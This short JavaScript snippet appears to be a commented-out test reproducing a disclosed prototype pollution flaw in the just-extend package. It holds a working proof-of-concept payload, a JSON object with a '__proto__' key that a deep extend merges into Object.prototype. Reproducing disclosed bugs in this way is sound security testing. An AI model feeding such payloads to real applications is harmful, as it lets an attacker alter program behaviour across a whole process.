// //https://hackerone.com/reports/430291
// test("prototype pollution in just-extend ", () => {
  const extend = require("just-extend");

  let obj = {};

console.log({}.polluted);

  let payload2 = JSON.parse('{"__proto__": {"polluted": "yes"}}');
  extend(true, {}, payload2);
console.log({}.polluted);
// });
